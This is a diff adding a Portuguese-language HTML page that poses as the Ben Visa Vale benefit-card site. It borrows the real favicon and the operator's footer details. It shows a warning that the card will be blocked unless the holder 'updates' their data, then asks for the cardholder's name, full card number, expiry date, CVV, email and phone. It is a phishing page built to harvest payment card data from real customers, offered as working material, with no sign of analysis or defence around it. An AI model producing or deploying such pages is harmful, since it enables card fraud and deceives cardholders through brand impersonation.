@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ben Visa Vale</title>
+    <link rel="icon" href="https://www.benvisavale.com.br/static/images/favicon/android-icon-192x192.png" type="image/x-icon">
+    <link rel="shortcut icon" href="https://www.benvisavale.com.br/static/images/favicon/android-icon-192x192.png" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <img src="img/banner.png" alt="Cartão Ben Único" class="banner">
+        </header>
+
+        <main class="main-content">
+            <img src="img/cartao.png" alt="Cartão Ben" class="card-image">
+            
+            <div class="alert">
+                <h2>Evite o Bloqueio do Seu Cartão!</h2>
+                <p>Atualize seus dados agora mesmo. A falta de atualização pode resultar no bloqueio do seu cartão BENVISA. Não deixe para depois!</p>
+            </div>
+            
+            <form class="form">
+                <label for="nome-titular">Nome do titular do cartão</label>
+                <input type="text" id="nome-titular" name="nome-titular" required>
+
+                <label for="numero-cartao">Número do cartão</label>
+                <input type="text" id="numero-cartao" name="numero-cartao" required>
+
+                <div class="input-row">
+                    <div>
+                        <label for="validade">Validade</label>
+                        <input type="text" id="validade" name="validade" required>
+                    </div>
+                    <div>
+                        <label for="cvv">CVV</label>
+                        <input type="text" id="cvv" name="cvv" required>
+                    </div>
+                </div>
+
+                <label for="email">E-mail</label>
+                <input type="email" id="email" name="email" required>
+
+                <label for="telefone">Telefone</label>
+                <input type="tel" id="telefone" name="telefone" required>
+
+                <div class="checkbox-container">
+                    <input type="checkbox" id="concordo" name="concordo" required>
+                    <label for="concordo">Concordo com a política de privacidade <a href="#">BENVISA</a></label>
+                </div>
+
+                <button type="submit" class="submit-button">CONFIRMAR DADOS</button>
+            </form>
+        </main>
+
+        <footer class="footer">
+            <p>central de atendimento</p>
+            <p>4004-4474 capitais e regiões metropolitanas</p>
+            <p>0800-723-4474 para demais localidades</p>
+            <p>disponível de segunda a sábado, das 08h às 20h, exceto em feriados nacionais</p>
+            <p>Pluxee Instituição de Pagamento S.A.</p>
+            <p>CNPJ/MF nº 30.798.783/0001-01</p>
+        </footer>
+    </div>
+    <script src="scripts.js"></script>
+</body>
+</html>
